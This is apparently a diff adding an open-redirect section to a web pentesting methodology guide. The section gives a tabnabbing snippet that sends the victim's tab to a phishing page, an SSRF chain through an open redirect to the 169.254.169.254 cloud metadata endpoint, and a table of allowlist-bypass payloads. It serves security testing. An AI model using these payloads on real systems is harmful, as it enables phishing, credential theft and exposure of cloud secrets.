@@ -900,3 +900,49 @@ Remediation:
 - `references/tools.md` â€” openredirex, gf, nuclei templates, Burp workflow
 - `references/oauth-redirect-guide.md` â€” full OAuth redirect_uri attack methodology
 
+
+
+---
+
+## From hack-skills: Additional Open Redirect Techniques
+
+### Tabnabbing (window.opener Attack)
+
+When a page opens a new tab with `target="_blank"` without `rel="noopener"`:
+`javascript
+// Injected into the opened tab (via XSS on a linked site, or when attacker controls the linked page):
+window.opener.location = "https://phishing.com/";
+// Victim's original tab now shows attacker's page — credential theft
+`
+
+**Trigger**: Any link `<a href="X" target="_blank">` without `rel="noopener noreferrer"`.
+
+**Bug class**: Mid-severity standalone; High when combined with clickjacking or social engineering.
+
+### SSRF via Open Redirect Chain
+
+`
+1. App blocks direct SSRF to 169.254.169.254
+2. App allowlists trusted.com
+3. trusted.com has open redirect to any URL
+4. Chain: ?url=https://trusted.com/redirect?to=http://169.254.169.254/latest/meta-data/
+5. Server follows 302 → reaches metadata endpoint
+`
+
+**Multi-hop filter bypass:**
+`
+?url=https://trusted.com/r?to=https://trusted2.com/go?url=http://169.254.169.254/
+`
+Each hop passes allowlist check; final hop reaches target.
+
+### URL Parser Differential Bypass Table
+
+| Payload | Browser Host | Server Host | Why |
+|---|---|---|---|
+| `//evil.com` | evil.com | evil.com | Protocol-relative |
+| `\/\/evil.com` | evil.com | evil.com | Backslash parsed as slash |
+| `//evil.com\@target.com` | evil.com | target.com | Parser differential |
+| `//target.com@evil.com` | evil.com | evil.com | Userinfo bypass |
+| `%09//evil.com` | evil.com | evil.com | Tab before // |
+| `evil.com%00.target.com` | evil.com | target.com | Null byte truncation |
+| `https://evil.com#target.com` | evil.com | evil.com | Fragment ignored |
